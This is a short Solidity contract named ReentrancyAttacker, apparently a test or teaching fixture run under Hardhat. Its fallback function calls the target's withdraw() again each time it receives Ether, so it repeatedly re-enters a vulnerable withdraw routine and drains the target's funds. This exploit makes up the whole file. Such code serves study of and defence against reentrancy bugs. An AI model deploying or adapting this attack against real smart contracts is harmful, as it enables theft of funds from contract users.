//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

import "hardhat/console.sol";

interface IDToken {
    function withdraw() external;
}

contract ReentrancyAttacker {
    IDToken public target;

    fallback () external payable {
        target.withdraw();
    }
    constructor (IDToken target_) {
        target = target_;
    }

    function invokeWithdraw() external  {
        target.withdraw();
    }
}
